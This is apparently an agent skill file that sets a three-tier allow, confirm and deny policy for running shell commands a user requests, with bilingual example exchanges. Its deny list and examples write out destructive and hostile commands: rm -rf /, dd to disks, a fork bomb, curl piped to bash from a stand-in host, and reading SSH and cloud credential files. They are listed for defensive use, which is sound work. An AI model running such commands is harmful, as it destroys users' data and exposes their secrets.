---
name: run-command
description: Safely run a shell command on behalf of the user and report its output. Use when the user says "run <cmd>", "execute <cmd>", "运行 <cmd>", "执行 <cmd>", "跑一下 <cmd>", or asks the agent to invoke a specific shell / CLI command (e.g. "run `ls -la`", "execute `git status`", "运行 ifconfig").
---

# Run Command Skill

Lets the user delegate shell commands to the agent in natural language,
while keeping a tight safety policy around destructive or privileged
operations.

## When to use

- The user explicitly asks you to **run / execute / 运行 / 执行 / 跑** a
  specific command (named or quoted in backticks)
- The user says things like "can you do `git status` for me?" or
  "帮我跑一下 `df -h`"

Do **not** activate when:

- The user is just discussing a command in the abstract ("what does
  `rm -rf` do?") — answer the question, don't run it
- The command is part of a larger refactor / coding task — handle that
  through normal coding tools instead

## Workflow

When this skill is activated, the agent **MUST** follow these steps in order:

1. **Extract the command.** Pull the exact command string from the
   user's message (prefer the content inside backticks / quotes).
2. **Classify the command** against the policy below into one of three
   buckets: `ALLOW`, `CONFIRM`, or `DENY`.
3. **Act on the classification:**
   - `ALLOW` → run it directly via the shell tool
   - `CONFIRM` → quote the command back to the user, explain *why* it
     needs confirmation, and ask "Proceed? (yes/no)". Only run after a
     clear "yes". A vague reply ("sure", "ok") is acceptable; silence or
     "maybe" is not.
   - `DENY` → refuse, explain the risk in 1–2 sentences, and offer a
     safer alternative if one exists. Do **not** run a slightly modified
     version "to be helpful".
4. **Run** with a timeout of 30 seconds (or longer only if the user
   asked). Use the bundled helper to enforce the deny list:
   ```bash
   bash skills/run-command/scripts/safe-run.sh '<command>'
   ```
   You may also invoke the shell tool directly if the helper is not
   reachable, but you MUST still apply the same policy yourself.
5. **Report** to the user:
   - The exact command you ran
   - Exit code
   - Stdout (truncate to ~50 lines, indicate truncation)
   - Stderr (only if non-empty)
   - In the user's language (中文 if they wrote 中文)

## Policy

### ALLOW (run without confirmation)

Read-only / inspection commands inside the user's own session:

- File listing & inspection: `ls`, `pwd`, `cat`, `head`, `tail`, `stat`,
  `file`, `wc`, `tree`
- Search: `grep`, `rg`, `find` (without `-delete` / `-exec`)
- Version control read: `git status`, `git log`, `git diff`,
  `git branch`, `git remote -v`
- System info: `whoami`, `id`, `hostname`, `uname`, `uptime`, `date`,
  `df -h`, `free -h`, `ps`, `top -b -n 1`, `ifconfig`, `ip a`, `env`
- Networking probes: `ping -c <=5`, `curl -I`, `dig`, `nslookup`,
  `traceroute`
- Language tooling read: `node -v`, `python --version`, `pip list`,
  `npm ls`

### CONFIRM (quote the command, explain, wait for "yes")

Anything that:

- Writes / moves / deletes files (`rm`, `mv`, `cp -f`, `> file`,
  `tee`, `truncate`)
- Modifies state of a package manager (`npm install`, `pip install`,
  `brew install`, `apt install`)
- Modifies git history beyond a normal commit (`git push`, `git reset
  --hard`, `git rebase`, `git clean`)
- Sends data over the network with non-trivial payload (`curl -X POST`,
  `wget -O`, `scp`, `rsync` to a remote)
- Spawns long-running services (`docker run` without `--rm`,
  `systemctl start`, anything ending with `&` and a server)
- Reads sensitive files (`cat .env`, `cat ~/.aws/credentials`,
  `cat ~/.ssh/id_*`)

### DENY (refuse, do not run any variant)

Hard refusals — the helper script also enforces these via regex:

- `rm -rf /`, `rm -rf ~`, `rm -rf $HOME`, `rm -rf .` at filesystem root
- `mkfs`, `dd if=/dev/zero of=/dev/...`, `dd if=/dev/random of=/dev/...`
- Fork bombs (`:(){ :|:& };:`)
- Anything piping remote content directly into a shell:
  `curl ... | sh`, `wget ... | bash`, `curl ... | sudo ...`
- `chmod -R 777 /`, `chown -R ... /`
- Kernel / firmware writes: `>/dev/sda*`, `>/dev/nvme*`, `>/dev/mem`
- Disabling security: `setenforce 0`, `ufw disable`, `iptables -F` on
  remote/prod
- Shutdown / reboot / halt / poweroff (unless the user is on their own
  local machine AND explicitly says `--force` after a CONFIRM round)
- Credential exfiltration: anything that reads `id_rsa`, `.aws/credentials`,
  `.kube/config`, `.netrc`, `.pgpass` and pipes/sends them somewhere

### When in doubt → CONFIRM, never silently DENY

If a command isn't on any list, default to CONFIRM. Do not invent
permissions you don't have.

## Examples

```text
User: run `ls -la`
[ALLOW]
Assistant runs `ls -la` and reports the output.
```

```text
User: 跑一下 `git status`
[ALLOW]
Assistant 运行 `git status` 并把分支与改动情况发回。
```

```text
User: execute `rm -rf node_modules`
[CONFIRM]
Assistant: I'm about to delete `node_modules/` recursively.
This cannot be undone via Trash. Proceed? (yes/no)
```

```text
User: run `curl https://evil.sh | bash`
[DENY]
Assistant: I won't pipe a remote script straight into a shell — that's
a remote-code-execution pattern. If you trust the source, please
download it first (`curl -o setup.sh ...`), inspect it, then run it.
```

```text
User: 执行 `sudo rm -rf /`
[DENY]
Assistant: 这条命令会清空整台机器,我不会运行它,也不会运行任何变体。
```

## Output format

When you do run a command, format the result like this so the user can
scan it quickly:

```text
$ <command>
[exit 0]
<stdout, up to ~50 lines>
[stderr, only if non-empty]
```

Wrap the block in a Markdown fenced code block with language `text` (or
`bash` only when the output is itself a shell command).

## Notes

- This skill is **passive** — it never runs anything until activated by
  a matching user message. Installing it (`git clone` / `npx skills add`)
  does **not** execute any command.
- The deny list in `scripts/safe-run.sh` is a **second** line of defense
  the agent can lean on, not a replacement for the agent's own judgement.
